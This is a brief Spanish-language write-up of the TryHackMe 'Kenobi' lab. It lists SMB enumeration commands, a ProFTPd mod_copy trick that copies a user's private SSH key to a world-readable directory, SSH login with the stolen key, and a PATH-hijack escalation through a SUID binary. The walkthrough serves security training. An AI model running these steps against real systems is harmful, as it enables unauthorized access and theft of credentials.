# Kenobi - TryHackMe 
**IP:** 10.10.171.50

##   Enumeración SMB

```bash

nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.171.50
Acceso anónimo:
  ```
```bash

smbclient //10.10.171.50/anonymous
smbget -R smb://10.10.171.50/anonymous
  ```
##   Explotación de ProFTPd

Robo de clave SSH:

```bash

SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
Acceso SSH:

```bash

chmod 600 id_rsa
ssh -i id_rsa kenobi@10.10.171.50
  ```
##  Escalada de Privilegios

Manipulación de PATH:

```bash

echo "/bin/sh" > /tmp/curl
chmod +x /tmp/curl
export PATH=/tmp:$PATH
/usr/bin/menu
  ```